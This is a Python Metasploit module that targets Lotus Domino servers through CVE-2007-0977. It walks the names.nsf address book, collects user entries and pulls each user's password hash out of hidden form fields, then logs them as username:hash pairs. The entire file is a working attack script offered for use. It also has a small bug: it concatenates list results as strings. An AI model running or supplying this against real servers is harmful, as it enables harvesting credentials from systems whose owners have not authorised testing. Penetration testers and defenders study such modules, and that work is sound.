#!/usr/bin/python

# standard module
import re
import logging

# extra modules
dependencies_missing = False
try:
    import requests
    from lxml import html
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Retrieve Lotus Domino Password Hashes',
    'description': '''
        This module will send requests to the names.nsf page on the specified
        Lotus Domino server and attempt to retrieve password hashes for users
        on the affected system.
    ''',
    'authors': [
        'Jacob Robles'
    ],
    'date': '2007-02-15',
    'references': [
        {'type': 'cve', 'ref': '2007-0977'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'user': {'type': 'string', 'description': 'Lotus username', 'required': False, 'default': ''},
        'pass': {'type': 'string', 'description': 'Lotus password', 'required': False, 'default': ''},
        'targeturi': {'type': 'string', 'description': 'Base URI for the Lotus application', 'required': True, 'default': '/'},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }}

def run(args):
    module.LogHandler.setup()
    if dependencies_missing:
        logging.error('Module dependencies (requests, lxml) are missing, cannot continue')
        return

    user = args['user']
    passwd = args['pass']
    path = '/names.nsf/People?OpenView'
    proto = 'https://' if args['ssl'] else 'http://'
    base = proto + args['rhost'] + args['targeturi']
    page = '/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&TemplateType=2&Seq=1&Start='

    r = requests.get(base + path, auth=(user, passwd), verify=False)
    tmplist = re.findall(r'<a href="(/names\.nsf/[0-9a-z]*/[0-9a-z]*\?OpenDocument)', r.text)
    sresults = list(set(tmplist))
    count = len(sresults)
    while len(tmplist) != 0:
        r = requests.get(base + page + str(count), auth=(user, passwd), verify=False)
        tmplist = re.findall(r'<a href="(/names\.nsf/[0-9a-z]*/[0-9a-z]*\?OpenDocument)', r.text)
        sresults += list(set(tmplist))
        count = len(sresults)
    logging.info('Number of accounts found: {}'.format(len(sresults)))

    logging.info('Retrieving password hashes...')
    for res in sresults:
        r = requests.get(base + res, auth=(user, passwd), verify=False)
        tree = html.fromstring(r.content)
        username = tree.xpath('//input[@name="$dspShortName"]/@value')[0]
        if tree.xpath('//input[@name="$dspHTTPPassword"]/@value') != []:
            pwd_hash = tree.xpath('//input[@name="$dspHTTPPassword"]/@value')
        elif tree.xpath('//input[@name="dspHTTPPassword"]/@value') != []:
            pwd_hash = tree.xpath('//input[@name="dspHTTPPassword"]/@value')
        elif tree.xpath('//input[@name="HTTPPassword"]/@value') != []:
            pwd_hash = tree.xpath('//input[@name="HTTPPassword"]/@value')
        else:
            pwd_hash = ''
        logging.info(username + ':' + pwd_hash)

if __name__ == '__main__':
    module.run(metadata, run)
